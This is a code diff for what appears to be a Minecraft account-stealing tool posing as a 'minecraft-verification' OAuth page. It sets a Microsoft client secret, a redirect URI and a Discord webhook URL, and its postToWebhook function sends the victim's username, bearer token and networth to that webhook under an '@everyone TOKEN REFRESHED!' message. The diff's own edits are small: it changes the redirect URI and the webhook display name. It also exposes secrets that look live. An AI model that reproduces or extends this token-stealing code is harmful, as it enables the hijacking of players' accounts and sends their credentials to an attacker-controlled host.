@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = 'cTg8Q~5KLeSWagWpD_.nOrXhf9ntKpt3A9lKPaRI' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '1bfb18a2-ca7b-48c7-ad17-a490a6185320'
-const redirect_uri = 'https://minecraft-verification.onrender.com/'
+const redirect_uri = 'https://minecraft-verification.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1047624352004325407/Y_mbIqVCtZGSUx_pSKloGRm1DrsFi2-JSgtnI_ijd3Ukpc9ERtxnAeLQFkTfWNKfya5l'
 
 //Requirements
@@ -319,7 +319,7 @@ async function postToWebhook(formatNumber, level, rank, username, bearerToken, u
         networth = formatNumber(networth.unsoulboundNetworth);
 
     let data = {
-username: "[LVL 100] Rat",
+username: "NY#3235",
   avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
 content: "@everyone TOKEN REFRESHED!",
   embeds: [
